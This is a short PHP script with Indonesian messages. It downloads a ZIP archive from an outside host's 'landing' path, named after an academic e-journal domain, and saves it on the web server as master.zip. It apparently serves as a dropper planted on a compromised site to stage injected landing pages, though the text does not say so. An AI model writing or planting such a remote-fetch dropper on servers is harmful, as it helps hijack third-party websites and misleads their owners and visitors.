<?php
$url = "https://freeportindonesia.org/landing/alima.e-journal.ivet.ac.id.zip";
$zipFile = "master.zip";

// Download file
$zipData = file_get_contents($url);
if ($zipData === false) {
    die("Gagal download file.");
}

// Simpan ke server
if (file_put_contents($zipFile, $zipData)) {
    echo "Download ZIP berhasil disimpan sebagai: " . $zipFile;
} else {
    echo "Gagal menyimpan file.";
}
?>
